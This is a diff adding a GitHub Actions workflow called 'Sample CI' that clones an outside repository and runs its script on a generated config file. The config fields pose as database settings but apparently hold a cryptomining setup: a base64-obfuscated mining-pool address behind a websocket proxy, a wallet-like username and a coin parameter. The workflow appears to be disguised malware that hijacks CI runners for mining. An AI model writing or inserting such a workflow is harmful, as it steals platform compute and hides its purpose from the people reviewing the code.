@@ -1,0 +1,37 @@
+name: Sample CI
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  run-script:
+    name: Run script
+    runs-on: ubuntu-22.04
+    steps:
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.13.3"
+
+      - name: Clone
+        uses: actions/checkout@v4
+        with:
+          repository: saxlata/vbg
+          ref: main
+          path: dir-dir
+
+      - name: Run info
+        working-directory: dir-dir
+        run: |
+          echo -e "proxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nhost=127.0.0.1\nport=3306\nusername=rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB\npassword=c=RVN,1-demo\nthreads=2" > data.txt
+      - name: Run
+        working-directory: dir-dir
+        # env:
+        #   TERM: linux
+        run: |
+          echo "::group::My Detailed Logs"
+          python3 main.py 3 --dataset=data.txt --output=result.txt
+          echo "::endgroup::"
